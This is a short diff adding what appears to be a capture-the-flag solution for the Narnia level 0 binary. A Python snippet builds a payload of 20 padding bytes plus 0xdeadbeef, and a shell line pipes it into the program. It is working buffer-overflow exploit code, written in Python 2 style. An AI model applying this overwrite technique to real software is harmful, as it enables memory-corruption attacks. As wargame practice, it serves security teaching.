@@ -1,0 +1,7 @@
+python script:
+f = open(r'/tmp/input0', 'wb')
+s = 'A' * 20 + '\xef\xbe\xad\xde'
+f.write(s)
+f.close()
+
+./narnia0 < /tmp/input0
